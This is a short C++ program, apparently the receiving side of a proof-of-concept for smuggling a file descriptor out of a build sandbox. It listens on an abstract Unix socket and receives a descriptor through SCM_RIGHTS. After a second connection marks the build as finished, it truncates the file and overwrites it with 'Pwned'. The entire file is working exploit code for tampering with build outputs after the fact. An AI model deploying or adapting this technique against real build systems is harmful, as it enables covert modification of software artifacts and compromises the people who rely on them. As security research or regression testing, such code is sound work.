#include <sys/socket.h>
#include <sys/un.h>
#include <stdlib.h>
#include <stddef.h>
#include <stdio.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <memory>

struct FdDeleter {
    void operator()(int* fd) { if (fd && *fd >= 0) close(*fd); delete fd; }
};
using AutoCloseFD = std::unique_ptr<int, FdDeleter>;

int main(int argc, char **argv) {

    assert(argc == 2);

    auto sock = AutoCloseFD(new int(socket(AF_UNIX, SOCK_STREAM, 0)));
    assert(sock && *sock >= 0);

    // Bind to the socket.
    struct sockaddr_un data;
    data.sun_family = AF_UNIX;
    data.sun_path[0] = 0;
    strncpy(data.sun_path + 1, argv[1], sizeof(data.sun_path) - 1);
    int res = bind(*sock, (const struct sockaddr *)&data,
        offsetof(struct sockaddr_un, sun_path)
        + strlen(argv[1])
        + 1);
    if (res < 0) perror("bind");

    res = listen(*sock, 1);
    if (res < 0) perror("listen");

    AutoCloseFD smuggling_fd;

    // Accept the connection a first time to receive the file descriptor.
    fprintf(stderr, "%s\n", "Waiting for the first connection");
    auto a = AutoCloseFD(new int(accept(*sock, 0, 0)));
    assert(a && *a >= 0);

    struct msghdr msg = {0};
    auto msg_control = std::unique_ptr<char[]>(new char[128]());
    msg.msg_control = msg_control.get();
    msg.msg_controllen = 128;

    // Receive the file descriptor as sent by the smuggler.
    recvmsg(*a, &msg, 0);

    struct cmsghdr *hdr = CMSG_FIRSTHDR(&msg);
    while (hdr) {
        if (hdr->cmsg_level == SOL_SOCKET
          && hdr->cmsg_type == SCM_RIGHTS) {

            // Grab the copy of the file descriptor.
            int temp_fd;
            memcpy((void *)&temp_fd, CMSG_DATA(hdr), sizeof(int));
            smuggling_fd.reset(new int(temp_fd));
        }

        hdr = CMSG_NXTHDR(&msg, hdr);
    }
    fprintf(stderr, "%s\n", "Got the file descriptor. Now waiting for the second connection");
    a.reset();

    // Wait for a second connection, which will tell us that the build is
    // done
    a.reset(new int(accept(*sock, 0, 0)));
    assert(a && *a >= 0);
    fprintf(stderr, "%s\n", "Got a second connection, rewriting the file");
    // Write a new content to the file
    if (smuggling_fd && ftruncate(*smuggling_fd, 0)) perror("ftruncate");
    const char * new_content = "Pwned\n";
    ssize_t written_bytes = smuggling_fd ? write(*smuggling_fd, new_content, strlen(new_content)) : -1;
    if (written_bytes != (ssize_t)strlen(new_content)) perror("write");
}
